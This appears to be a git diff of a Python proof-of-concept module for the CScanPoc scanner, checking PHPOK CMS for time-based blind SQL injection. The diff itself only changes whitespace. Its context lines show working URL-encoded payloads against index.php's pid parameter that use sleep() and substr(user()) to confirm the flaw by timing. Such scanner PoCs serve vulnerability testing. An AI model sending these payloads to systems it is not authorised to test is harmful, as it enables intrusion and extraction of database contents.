@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'PHPOK_0013'  # 平台漏洞编号，留空
     name = 'PHPOK SQL注入'  # 漏洞名称
@@ -34,7 +35,6 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-
             payload_sleep = "/index.php?c=open&f=url&pid=0%20or%20if%28ord%28substr%28user%28%29%2C1%2C1%29%29%3D1%2Csleep%28%205%29%2C1%29%3D0"
             payload_normal = "/index.php?c=open&f=url&pid=0%20or%20if%28ord%28substr%28user%28%29%2C1%2C1%29%29%3D1%2Cmd5%28%20c%29%2C1%29%3D0"
             url_sleep = self.target + payload_sleep
@@ -48,12 +48,13 @@ class Poc(ABPoc):
             if (time_end_sleep-time_end_normal)-(time_end_normal-time_start) > 4:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
